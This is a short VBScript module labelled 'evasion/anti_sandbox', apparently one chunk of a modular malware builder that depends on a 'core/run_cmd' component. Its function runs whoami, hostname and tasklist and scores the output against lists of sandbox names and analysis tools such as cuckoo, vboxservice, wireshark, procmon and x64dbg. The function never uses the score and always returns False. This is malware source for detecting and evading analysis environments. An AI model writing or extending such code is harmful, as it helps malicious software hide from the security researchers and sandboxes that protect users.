' chunk: evasion/anti_sandbox
' depends: core/run_cmd
' provides: check_sandbox
' format: vbscript
' note: Environment fingerprinting for execution diversity.
'   All checks run to build varied runtime behavior, but results are
'   consumed silently — never gates execution.

Function check_sandbox()
    check_sandbox = False
    Dim usr, hostname, procs, score
    score = 0
    usr = LCase(Trim(_run("whoami")))
    Dim sandboxUsers, i
    sandboxUsers = Array("sandbox", "cuckoo", "virus", "sample")
    For i = 0 To UBound(sandboxUsers)
        If InStr(usr, sandboxUsers(i)) > 0 Then score = score + 1
    Next
    hostname = LCase(Trim(_run("hostname")))
    Dim sandboxHosts
    sandboxHosts = Array("sandbox", "cuckoo", "analysis")
    For i = 0 To UBound(sandboxHosts)
        If InStr(hostname, sandboxHosts(i)) > 0 Then score = score + 1
    Next
    procs = LCase(_run("tasklist /fo csv /nh"))
    Dim sandboxProcs
    sandboxProcs = Array("vboxservice", "vmtoolsd", "wireshark", "procmon", "fiddler", "x64dbg", "ollydbg")
    For i = 0 To UBound(sandboxProcs)
        If InStr(procs, sandboxProcs(i)) > 0 Then score = score + 1
    Next
End Function
